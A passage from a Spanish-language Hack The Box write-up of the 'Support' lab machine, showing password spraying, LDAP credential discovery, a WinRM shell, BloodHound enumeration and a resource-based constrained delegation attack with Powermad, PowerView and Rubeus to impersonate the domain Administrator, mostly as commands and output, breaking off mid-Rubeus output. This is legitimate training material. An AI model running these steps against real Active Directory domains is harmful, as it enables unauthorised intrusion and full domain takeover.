group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Shared Support Accounts] rid:[0x44f]
```
Igual vemos varios grupos, entre ellos está el más importante de todos, el grupo **Domain Controllers** y el de **Admins**.

Por ahora, apuntemos al grupo de Admins para ver cuantos son administradores, usa el comando `querygroupmem num_rid` para ver los **rid** de cada usuario y con `queryuser num_rid_usuario` obtén la información de los usuarios encontrados:
```batch
rpcclient $> querygroupmem 0x200
        rid:[0x1f4] attr:[0x7]
rpcclient $> queryuser 0x1f4
        User Name   :   Administrator
        Full Name   :
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   Built-in account for administering the computer/domain
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      vie, 27 sep 2024 11:52:52 CST
        Logoff Time              :      mié, 31 dic 1969 18:00:00 CST
        Kickoff Time             :      mié, 31 dic 1969 18:00:00 CST
        Password last set Time   :      mar, 19 jul 2022 12:55:57 CDT
        Password can change Time :      mié, 20 jul 2022 12:55:57 CDT
        Password must change Time:      mié, 13 sep 30828 20:48:05 CST
        unknown_2[0..31]...
        user_rid :      0x1f4
        group_rid:      0x201
        acb_info :      0x00000010
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000056
        padding1[0..7]...
        logon_hrs[0..21]...
```
Solamente está el usuario administrador, no hay más.

Si quieres, puedes obtener los usuarios fuera de la sesión de **rpcclient**:
```batch
rpcclient -U 'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' 10.10.11.174 -c 'enumdomusers'
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[ldap] rid:[0x450]
user:[support] rid:[0x451]
user:[smith.rosario] rid:[0x452]
user:[hernandez.stanley] rid:[0x453]
user:[wilson.shelby] rid:[0x454]
user:[anderson.damian] rid:[0x455]
user:[thomas.raphael] rid:[0x456]
user:[levine.leopoldo] rid:[0x457]
user:[raven.clifton] rid:[0x458]
user:[bardot.mary] rid:[0x459]
user:[cromwell.gerard] rid:[0x45a]
user:[monroe.david] rid:[0x45b]
user:[west.laura] rid:[0x45c]
user:[langley.lucy] rid:[0x45d]
user:[daughtler.mabel] rid:[0x45e]
user:[stoll.rachelle] rid:[0x45f]
user:[ford.victoria] rid:[0x460]
```
Puedes ocupar el comando **grep** y **tr** para obtener solo los nombres de los usuarios, pero eso ya te lo dejo a ti.

No hemos encontrado nada más, pero podemos probar si de casualidad están usando la misma contraseña para otros usuarios. Esto es algo común que siempre debemos probar.

### Aplicando Password Spraying con crackmapexec, Enumerando Servicio LDAP con ldapsearch y Ganando Acceso a la Máquina {#spraying}

¿Qué es **Password Spraying**?

| **Password Spraying** |
|:-----------:|
| *Password spraying es una técnica utilizada en ataques de seguridad en la que el atacante intenta acceder a múltiples cuentas de usuario en un sistema o red utilizando contraseñas comunes o débiles, pero de una manera que evita el bloqueo de cuentas por demasiados intentos fallidos.* |

Probemos esto con la contraseña que tenemos, en los usuarios que encontramos en el **servicio LDAP**:
```bash
crackmapexec smb 10.10.11.174 -u users -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --continue-on-success
SMB         10.10.11.174    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [-] support.htb\Administrator:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\Guest:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\krbtgt:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
SMB         10.10.11.174    445    DC               [-] support.htb\support:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\smith.rosario:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\hernandez.stanley:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\wilson.shelby:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\anderson.damian:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\thomas.raphael:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\levine.leopoldo:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\raven.clifton:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\bardot.mary:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\cromwell.gerard:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\monroe.david:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\west.laura:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\langley.lucy:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\daughtler.mabel:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\stoll.rachelle:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\ford.victoria:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz STATUS_LOGON_FAILURE
```
Al parecer, no encontro qué se este usando esta contraseña en otro usuario.

Como no hemos encontrado algo más, veamos en qué nos puede ayudar **Hacktricks**.

Aquí lo tienes:
* <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap#enumeration" target="_blank">389, 636, 3268, 3269 - Pentesting LDAP</a>

Aquí nos comparten un comando de la herramienta **ldapsearch**, que nos ayuda a obtener más información del **servicio LDAP**.

Probemos el segundo comando, ya que disponemos de credenciales válidas:
```bash
ldapsearch -x -H ldap://10.10.11.174 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"
# extended LDIF
#
# LDAPv3
# base <DC=support,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#
# support.htb
dn: DC=support,DC=htb
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=support,DC=htb
instanceType: 5
...
...
...
```
Obtuvo demasiada información, pero podemos ir filtrando con el comando **grep**.

Primero, vamos a aplicar un filtro que nos obtenga solamente los nombres de los usuarios, que al parecer los representa con el nombre **sAMAccountName**:
```bash
ldapsearch -x -H ldap://10.10.11.174 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" | grep -i 'samaccountname'
sAMAccountName: Administrator
sAMAccountName: Guest
sAMAccountName: Administrators
sAMAccountName: Users
sAMAccountName: Guests
sAMAccountName: Print Operators
sAMAccountName: Backup Operators
sAMAccountName: Replicator
sAMAccountName: Remote Desktop Users
...
...
...
```

Podemos probar a ver si obtenemos solamente un usuario:
```bash
ldapsearch -x -H ldap://10.10.11.174 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" | grep -i 'samaccountname: Administrator'
sAMAccountName: Administrator
```
Sí podemos.

La idea aquí es ir obteniendo la información de cada usuario que pueda encontrar la herramienta **ldapsearch**, pero para no alargar esto, revisa el **usuario support**, verás algo interesante por ahí:
```bash
ldapsearch -x -H ldap://10.10.11.174 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" | grep -i 'samaccountname: support' -B 40
dSCorePropagationData: 20220528111146.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133719420986193087
# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 12630
...
...
...
```
Esa parece ser una contraseña en texto claro, podemos probarla en todas las cuentas como ya lo hicimos con la anterior contraseña usando **crackmapexec**.

Intentemos:
```bash
crackmapexec smb 10.10.11.174 -u users -p 'Ironside47pleasure40Watchful' --continue-on-success
SMB         10.10.11.174    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [-] support.htb\Administrator:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\Guest:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\krbtgt:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\ldap:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [+] support.htb\support:Ironside47pleasure40Watchful 
SMB         10.10.11.174    445    DC               [-] support.htb\smith.rosario:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\hernandez.stanley:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\wilson.shelby:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\anderson.damian:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\thomas.raphael:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\levine.leopoldo:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\raven.clifton:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\bardot.mary:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\cromwell.gerard:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\monroe.david:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\west.laura:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\langley.lucy:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\daughtler.mabel:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\stoll.rachelle:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\ford.victoria:Ironside47pleasure40Watchful STATUS_LOGON_FAILURE 
```
Excelente, al parecer esa contraseña es del **usuario support**. 

Comprobemoslo con **crackmapexec** y de paso probemos si tienen activo (que lo más seguro es que sí) el **servicio WinRM**:
```bash
crackmapexec winrm 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'
SMB         10.10.11.174    5985   DC               [*] Windows 10.0 Build 20348 (name:DC) (domain:support.htb)
HTTP        10.10.11.174    5985   DC               [*] http://10.10.11.174:5985/wsman
WINRM       10.10.11.174    5985   DC               [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)
```

Muy bien, probemos a conectarnos al **servicio WinRM** usando la herramienta **evil-winrm**:
```bash
evil-winrm -i 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'
Evil-WinRM shell v3.4
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents> whoami
support\support
```

Ahora, obtengamos la flag del usuario:
```batch
*Evil-WinRM* PS C:\Users\support\Documents> dir
*Evil-WinRM* PS C:\Users\support\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\support\Desktop> dir
*
    Directory: C:\Users\support\Desktop
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         9/27/2024  10:52 AM             34 user.txt
```
Bien, continúa una parte algo pesada (o lo fue para mí), pero sé que te gustará.

## Post Explotación {#Post}

### Enumeración de la Máquina con BloodHound {#Blood}

Primero vamos a investigar nuestros privilegios, hazlo con el comando `whoami /priv`:
```batch
*Evil-WinRM* PS C:\Users\support\Desktop> whoami /priv
*
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
No veo algo que nos ayude a escalar.

Veamos la información de nuestro **usuario support**:
```batch
*Evil-WinRM* PS C:\Users\support\Desktop> net user support
User name                    support
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/28/2022 4:12:00 AM
Password expires             Never
Password changeable          5/29/2022 4:12:00 AM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   9/27/2024 2:47:10 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Shared Support Accoun*Domain Users
The command completed successfully.
```
No hay mucha información.

Veamos los grupos existentes en la máquina con el comando `net group`:
```batch
*Evil-WinRM* PS C:\Users\support\Desktop> net group
Group Accounts for \\
-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Key Admins
*Protected Users
*Read-only Domain Controllers
*Schema Admins
*Shared Support Accounts
The command completed with one or more errors.
```
Hay bastantes grupos, pero me llama la atención el último que aparece que se llama **Shared Support Accounts**, ya que no parece ser un grupo por defecto.

Al ser un **Directorio Activo**, podemos ocupar la herramienta **BloodHound** para enumerar toda la información posible de los usuarios de la máquina. Además, nos puede dar consejos sobre qué ataques podemos utilizar, para realizar esto, igual ocupamos la herramienta **SharpHound** que recopila la información.

Hay 2 versiones de **BloodHound**, para ambas se necesita una versión distinta de **SharpHound** para que pueda funcionar:
* <a href="https://github.com/BloodHoundAD/BloodHound/releases/tag/v4.3.1" target="_blank">Repositorio de BloodHoundAD: BloodHound Versión 4.3.1</a> -> <a href="https://github.com/BloodHoundAD/SharpHound/releases?page=2" target="_blank">Repositorio de BloodHoundAD: SharpHound - Releases (Busca la Versión 1.1.1)</a>

* <a href="https://github.com/SpecterOps/BloodHound" target="_blank">Repositorio de SpecterOps: BloodHound CE</a> -> <a href="https://github.com/BloodHoundAD/SharpHound/releases" target="_blank">Repositorio de BloodHoundAD: SharpHound - Releases (Cualquier Versión 2x)</a>

Puedes ocupar cualquiera de los dos, pero por ahora ocupare la primera opción, pues no he probado al 100% **BloodHound CE**.

Con la versión **BloodHound CE**, se automatiza bastante el despliegue de la herramienta, por lo que es muy recomendable usarla. Además, de que es la más actualizada, pero esto lo dejo a tu consideración.

Una vez que despliegues **BloodHound**, sube la herramienta **SharpHound** a la sesión de **evil-winrm** para poder usarla:
```batch
*Evil-WinRM* PS C:\Users\support\Documents> upload SharpHound.exe
Info: Uploading ../SharpHound.exe
Data: 1402880 bytes of 1402880 bytes copied
Info: Upload successful!
*Evil-WinRM* PS C:\Users\support\Documents> dir

    Directory: C:\Users\support\Documents

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/28/2024   8:28 PM        1052160 SharpHound.exe
```

Una vez cargada, nosotros queremos obtener todo lo que se pueda obtener, por lo que ocuparemos el parámetro `-c All`:
```batch
*Evil-WinRM* PS C:\Users\support\Documents> .\SharpHound.exe -c All
2024-09-28T20:29:38.9858283-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2024-09-28T20:29:39.0952024-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-09-28T20:29:39.1108265-07:00|INFORMATION|Initializing SharpHound at 8:29 PM on 9/28/2024
2024-09-28T20:29:39.1733302-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for support.htb : dc.support.htb
2024-09-28T20:29:39.2983299-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-09-28T20:29:39.4077016-07:00|INFORMATION|Beginning LDAP search for support.htb
2024-09-28T20:29:39.4389584-07:00|INFORMATION|Producer has finished, closing LDAP channel
2024-09-28T20:29:39.4389584-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-09-28T20:30:10.1733319-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 37 MB RAM
2024-09-28T20:30:22.9702043-07:00|INFORMATION|Consumers finished, closing output channel
2024-09-28T20:30:23.0014527-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2024-09-28T20:30:23.1108309-07:00|INFORMATION|Status: 109 objects finished (+109 2.534884)/s -- Using 44 MB RAM
2024-09-28T20:30:23.1108309-07:00|INFORMATION|Enumeration finished in 00:00:43.7019198
2024-09-28T20:30:23.1733342-07:00|INFORMATION|Saving cache with stats: 68 ID to type mappings.
 68 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2024-09-28T20:30:23.1733342-07:00|INFORMATION|SharpHound Enumeration Completed at 8:30 PM on 9/28/2024! Happy Graphing!
*Evil-WinRM* PS C:\Users\support\Documents> dir

    Directory: C:\Users\support\Documents

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/28/2024   8:30 PM          12595 20240928203022_BloodHound.zip
-a----         9/28/2024   8:28 PM        1052160 SharpHound.exe
-a----         9/28/2024   8:30 PM          10176 YzgyNDA2MjMtMDk1ZC00MGYxLTk3ZjUtMmYzM2MzYzVlOWFi.bin
```

Bien, esto nos generó un archivo comprimido, vamos a descargarlo y lo vamos a cargar en **BloodHound**:
```batch
*Evil-WinRM* PS C:\Users\support\Documents> download 20240928203022_BloodHound.zip BloodH.zip
Info: Downloading C:\Users\support\Documents\20240928203022_BloodHound.zip to BloodH.zip
Info: Download successful!
```

<p align="center">
<img src="/assets/images/htb-writeup-support/Captura17.png">
</p>

De aquí podemos sacar un montón de información que nos puede ayudar, pero recordemos que hay un grupo que nos pareció curioso, vamos a buscarlo con **BloodHound**:

<p align="center">
<img src="/assets/images/htb-writeup-support/Captura18.png">
</p>

Observa que hay 9 objetivos de valor alto que se pueden alcanzar en este grupo. Además, el **SID** nos indica que no es un grupo por defecto, pues todos los grupos por defecto tienen un **SID** que muestra los últimos dígitos menores a 1000.

Veamos qué objetivos de alto valor hay en este grupo:

<p align="center">
<img src="/assets/images/htb-writeup-support/Captura19.png">
</p>

Esto es tremendo. 

Observa que la computadora **DC.SUPPORT.HTB** es miembro del grupo de la controladora de dominio y tiene la sesión del administrador, es aquí donde podemos saber a dónde apuntar.

Veamos qué información nos puede dar si abrimos la opción de ayuda sobre **Generic All**:

<p align="center">
<img src="/assets/images/htb-writeup-support/Captura20.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-support/Captura21.png">
</p>

Nos indica que podemos aplicar el **resource based constrained delegation attack**, e incluso nos da los pasos para poder aplicarlo. 

### Aplicando Resource-based Constrained Delegation Attack {#ataque}

¿Qué es el **resource based constrained delegation attack**?

| **Resource-based Constrained Delegation Attack** |
|:-----------:|
| *Un Resource-Based Constrained Delegation Attack (o ataque de delegación restringida basada en recursos) es una técnica de ataque en Active Directory que explota la delegación restringida basada en recursos de Kerberos, lo que permite a un atacante ganar acceso a servicios y realizar acciones en nombre de otros usuarios, incluso cuentas privilegiadas, sin necesidad de sus credenciales.* |

Podríamos seguir los pasos que indica **BloodHound**, pero si usamos **HackTricks** nos explican más cómo funciona y cómo se usa este ataque:
* <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation" target="_blank">Resource-based Constrained Delegation</a>

Antes que nada y primero que todo, vamos a cargar las siguientes herramientas a nuestra sesión:
* <a href="https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1" target="_blank">Repositorio de Kevin-Robertson: Powermad.ps1</a>
* <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1?ref=blog.zsec.uk" target="_blank">Repositorio de PowerShellMafia: PowerView.ps1</a>
* <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries" target="_blank">Repositorio de r3motecontrol: GhostPack-Compiled Binaries (Rubeus.exe)</a>

Carguémoslos:
```batch
*Evil-WinRM* PS C:\Users\support\Documents> upload Powermad.ps1
Info: Uploading /../Powermad.ps1 to C:\Users\support\Documents\Powermad.ps1
Data: 180768 bytes of 180768 bytes copied
Info: Upload successful!
*Evil-WinRM* PS C:\Users\support\Documents> upload PowerView.ps1
Info: Uploading /../PowerView.ps1 to C:\Users\support\Documents\PowerView.ps1
Data: 1027036 bytes of 1027036 bytes copied
Info: Upload successful!
*Evil-WinRM* PS C:\Users\support\Documents> upload /Ghostpack-CompiledBinaries/Rubeus.exe
Info: Uploading /..//Ghostpack-CompiledBinaries/Rubeus.exe to C:\Users\support\Documents\Rubeus.exe
Data: 595968 bytes of 595968 bytes copied
Info: Upload successful!
```

Y vamos a cargar los **módulos Powermad.ps1 y PowerView.ps1**:
```batch
*Evil-WinRM* PS C:\Users\support\Documents> Import-Module .\Powermad.ps1
*Evil-WinRM* PS C:\Users\support\Documents> Import-Module .\PowerView.ps1
```

Ahora, a partir de aquí, podemos seguir los pasos que nos indica **HackTricks**:

* Primero vamos a crear una cuenta nueva, tal como indica **HackTricks**:
```batch
*Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
Verbose: [+] Domain Controller = dc.support.htb
Verbose: [+] Domain = support.htb
Verbose: [+] SAMAccountName = SERVICEA$
Verbose: [+] Distinguished Name = CN=SERVICEA,CN=Computers,DC=support,DC=htb
[+] Machine account SERVICEA added
```
Recuerda esta contraseña, porque la vamos a ocupar después.

* Podemos comprobar que se creó la nueva cuenta con el módulo de **PowerView**:
```batch
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer SERVICEA
pwdlastset             : 9/28/2024 8:48:14 PM
logoncount             : 0
badpasswordtime        : 12/31/1600 4:00:00 PM
distinguishedname      : CN=SERVICEA,CN=Computers,DC=support,DC=htb
objectclass            : {top, person, organizationalPerson, user...}
name                   : SERVICEA
objectsid              : S-1-5-21-1677581083-3380853377-188903654-5601
samaccountname         : SERVICEA$
localpolicyflags       : 0
codepage               : 0
samaccounttype         : MACHINE_ACCOUNT
accountexpires         : NEVER
countrycode            : 0
whenchanged            : 9/29/2024 3:48:14 AM
instancetype           : 4
usncreated             : 86137
objectguid             : 7e63ed00-3cf5-42d5-8659-6013ef633519
lastlogon              : 12/31/1600 4:00:00 PM
lastlogoff             : 12/31/1600 4:00:00 PM
objectcategory         : CN=Computer,CN=Schema,CN=Configuration,DC=support,DC=htb
dscorepropagationdata  : 1/1/1601 12:00:00 AM
serviceprincipalname   : {RestrictedKrbHost/SERVICEA, HOST/SERVICEA, RestrictedKrbHost/SERVICEA.support.htb, HOST/SERVICEA.support.htb}
ms-ds-creatorsid       : {1, 5, 0, 0...}
badpwdcount            : 0
cn                     : SERVICEA
useraccountcontrol     : WORKSTATION_TRUST_ACCOUNT
whencreated            : 9/29/2024 3:48:14 AM
primarygroupid         : 515
iscriticalsystemobject : False
usnchanged             : 86139
dnshostname            : SERVICEA.support.htb
```

* Seguimos los pasos que nos indica **HackTricks**:
```batch
*Evil-WinRM* PS C:\Users\support\Documents> $ComputerSid = Get-DomainComputer SERVICEA -Properties objectsid | Select -Expand objectsid
*Evil-WinRM* PS C:\Users\support\Documents> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
*Evil-WinRM* PS C:\Users\support\Documents> $SDBytes = New-Object byte[] ($SD.BinaryLength)
*Evil-WinRM* PS C:\Users\support\Documents> $SD.GetBinaryForm($SDBytes, 0)
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer dc -Properties 'msds-allowedtoactonbehalfofotheridentity'
msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
Con el último comando, comprobamos que todo funcionó correctamente.

Lo siguiente que podemos hacer, es aplicar el **ataque S4U**, pero ¿de qué se trata?

#### Aplicando Ataque S4U en Conjunto con Resource-based Constrained Delegation Attack {#s4u}

| **Ataque S4U** |
|:-----------:|
| *El ataque S4U (Service for User) es un tipo de ataque que explota ciertas características del protocolo de autenticación Kerberos en entornos de Active Directory (AD), específicamente los mecanismos S4U2Self y S4U2Proxy. Este ataque puede permitir a un atacante escalar privilegios o acceder a recursos de red sin la necesidad de poseer la contraseña de un usuario legítimo.* |

Entendamos de que van los **mecanismos S4U2Self y S4U2Proxy**.

| **Mecanismo S4U2Self** |
|:-----------:|
| *Permite que un servicio obtenga un ticket de servicio (TGS) para sí mismo en nombre de un usuario, sin que el usuario tenga que autenticarse directamente.* |

| **Mecanismo S4U2Proxy** |
|:-----------:|
| *Permite que un servicio actúe en nombre de un usuario para acceder a otro servicio dentro del dominio.* |

En resumen, nos va a generar un **Ticket de Servicio/Ticket Granting Service (TGS)** que nos va a permitir suplantar a cualquier usuario que deseemos dentro del **servicio Kerberos**.

Vamos a aplicarlo, las instrucciones vienen en la misma página de **HackTricks**:

* Obteniendo el hash de la contraseña de nuestra cuenta creada anteriormente **SERVICEA**, esto lo hacemos con la herramienta **Rubeus.exe**:
```batch
*Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe hash /password:123456 /user:SERVICEA$ /domain:domain.local
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___

  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/
*
  v2.2.0
*
[*] Action: Calculate Password Hash(es)
[*] Input password             : 123456
[*] Input username             : SERVICEA$
[*] Input domain               : domain.local
[*] Salt                       : DOMAIN.LOCALhostservicea.domain.local
[*]       rc4_hmac             : 32ED87BDB5FDC5E9CBA88547376818D4
[*]       aes128_cts_hmac_sha1 : 1E5248341DC1D9A8A0774E59C56BA04D
[*]       aes256_cts_hmac_sha1 : B0CC133208D6CB14DC0CF34C3CD432E67559D097B5E49BF974FD66D9EE281146
[*]       des_cbc_md5          : 072CD9DA7CE3D3B0
```
Esto nos imprime los **hashes RC4 y AES** de esa cuenta.

* Aplicamos el **ataque S4U** que nos va a generar un ticket para convertirnos en el **usuario Administrador**:
```batch
*Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe s4u /user:SERVICEA$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___

  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/
*
  v2.2.0
*
[*] Action: S4U
[*] Using rc4_hmac hash: 32ED87BDB5FDC5E9CBA88547376818D4
[*] Building AS-REQ (w/ preauth) for: 'support.htb\SERVICEA$'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):
...
...
...
